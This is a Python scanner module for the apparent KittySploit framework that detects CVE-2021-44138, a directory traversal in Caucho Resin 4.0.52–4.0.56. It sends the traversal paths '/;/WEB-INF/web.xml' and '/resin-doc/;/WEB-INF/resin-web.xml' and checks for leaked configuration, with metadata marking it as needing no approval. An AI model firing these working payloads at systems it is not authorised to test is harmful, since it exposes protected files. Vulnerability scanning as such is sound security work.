#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""There is a Directory traversal vulnerability in Caucho Resin, as distributed in Resin 4."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Caucho Resin >=4.0.52 <=4.0.56 - Directory traversal Detection',
        'description': 'There is a Directory traversal vulnerability in Caucho Resin, as distributed in Resin 4.0.52 - 4.0.56, which allows remote attackers to read files in arbitrary directories via a ; in a pathname within an HTTP request.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'cve', 'cve2021', 'resin', 'caucho', 'lfi', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 2,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://nvd.nist.gov/vuln/detail/cve-2021-44138',
            'https://github.com/maybe-why-not/reponame/issues/2',
        ],
        'cve': 'CVE-2021-44138',
    }

    def run(self):
        for path in ('/;/WEB-INF/web.xml', '/resin-doc/;/WEB-INF/resin-web.xml'):
            r = self.http_request(method="GET", path=path, allow_redirects=False)
            if not r or r.status_code != 200:
                continue
            body = r.text or ""
            headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
            body_all = ('<web-app', '</web-app>',)
            header_any = ('text/xml', 'application/xml',)
            if (all(m in body for m in body_all)) and (any(m in headers for m in header_any)):
                self.set_info(
                    severity='high',
                    reason="Caucho Resin >=4.0.52 <=4.0.56 - Directory traversal detected",
                    path=path,
                )
                return True
        return False

